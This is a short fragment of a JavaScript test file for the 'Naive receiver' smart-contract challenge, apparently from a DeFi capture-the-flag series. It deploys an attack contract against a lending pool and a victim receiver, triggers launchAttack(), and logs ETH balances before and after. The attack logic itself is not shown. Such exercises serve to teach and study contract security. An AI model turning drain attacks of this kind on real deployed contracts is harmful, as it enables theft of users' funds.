...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Execution', async function () {
        ...
        const ETH = await pool.ETH();
        const NaiveReceiverLAttack = await ethers.getContractFactory('NaiveReceiverAttack', deployer);
        attacker = await NaiveReceiverLAttack.deploy(
            pool.address, // pool address
            receiver.address, // victime address
        );

        console.log("pool ETH balance:", await ethers.provider.getBalance(pool.address));
        console.log("receiver ETH balance:", await ethers.provider.getBalance(receiver.address));
        await attacker.connect(player).launchAttack();
        console.log("pool ETH balance:", await ethers.provider.getBalance(pool.address));
        console.log("receiver ETH balance:", await ethers.provider.getBalance(receiver.address));
